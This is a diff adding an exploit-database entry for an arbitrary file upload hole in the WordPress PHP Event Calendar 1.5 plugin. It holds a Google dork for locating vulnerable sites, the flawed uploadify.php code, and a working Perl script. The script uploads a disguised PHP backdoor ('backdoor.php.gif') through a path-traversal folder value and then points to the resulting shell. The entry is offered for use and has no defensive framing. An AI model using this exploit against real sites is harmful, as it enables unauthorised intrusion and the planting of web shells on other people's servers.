@@ -1,0 +1,84 @@
+id: 23481
+date: 04/04/2015
+title: WordPress PHP Event Calendar 1.5 Arbitrary File Upload Vulnerability
+author: CrashBandicot69
+cves: 
+
+######################################################################
+# Exploit Title: Wordpress PHP Event Calendar Plugin - Arbitrary File Upload
+# Google Dork: inurl:/plugins/php-event-calendar/
+# Date: 02.04.2015
+# Exploit Author: CrashBandicot (@DosPerl)
+# Source Plugin: https://wordpress.org/plugins/php-event-calendar/
+# Vendor HomePage: http://phpeventcalendar.com/
+# Version: 1.5
+# Tested on: MSwin
+######################################################################
+
+# Path of File : /wp-content/plugins/php-event-calendar/server/classes/uploadify.php
+# Vulnerable File : uploadify.php
+
+<?php
+/*
+Uploadify
+Copyright (c) 2012 Reactive Apps, Ronnie Garcia
+Released under the MIT License <http://www.opensource.org/licenses/mit-license.php> 
+*/
+
+// Define a destination
+//$targetFolder = '/uploads'; // Relative to the root
+$targetFolder = $_POST['targetFolder']; // wp upload directory
+$dir = str_replace('\\','/',dirname(__FILE__));
+
+//$verifyToken = md5('unique_salt' . $_POST['timestamp']);
+
+if (!empty($_FILES)) {
+    $tempFile = $_FILES['Filedata']['tmp_name'];
+    //$targetPath = $dir.$targetFolder;
+    $targetPath = $targetFolder;
+    $fileName = $_POST['user_id'].'_'.$_FILES['Filedata']['name'];
+    $targetFile = rtrim($targetPath,'/') . '/' . $fileName;
+
+    // Validate the file type
+    $fileTypes = array('jpg','jpeg','gif','png'); // File extensions
+    $fileParts = pathinfo($_FILES['Filedata']['name']);
+
+    if (in_array($fileParts['extension'],$fileTypes)) {
+        move_uploaded_file($tempFile,$targetFile);
+        echo '1';
+    } else {
+        echo 'Invalid file type.';
+    }
+}
+?>
+
+
+# Exploit
+
+#!/usr/bin/perl
+
+use LWP::UserAgent;
+
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+
+print "\t   +===================================================\n";
+print "\t   | PHP event Calendar Plugin - Arbitrary File Upload \n";
+print "\t   | Author: CrashBandicot\n";
+print "\t   +===================================================\n\n";
+
+die "usage : perl $0 backdoor.php.gif" unless $ARGV[0];
+
+ $file = $ARGV[0];
+
+my $ua = LWP::UserAgent->new( agent => q{Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36},);
+my $ch = $ua->post("http://127.0.0.1/wp-content/plugins/php-event-calendar/server/classes/uploadify.php", Content_Type => 'form-data', Content => [ 'Filedata' => [$file] , targetFolder => '../../../../../' , user_id => '0day' ])->content;
+if($ch = ~/1/) { 
+print "\n  [+] File Uploaded !";
+} else { print "\n  [-] Target not Vuln"; }
+
+__END__
+
+
+# Path Shell : http://localhost/0day_backdoor.php.gif
+
+#  0day.today [2023-03-24]  #
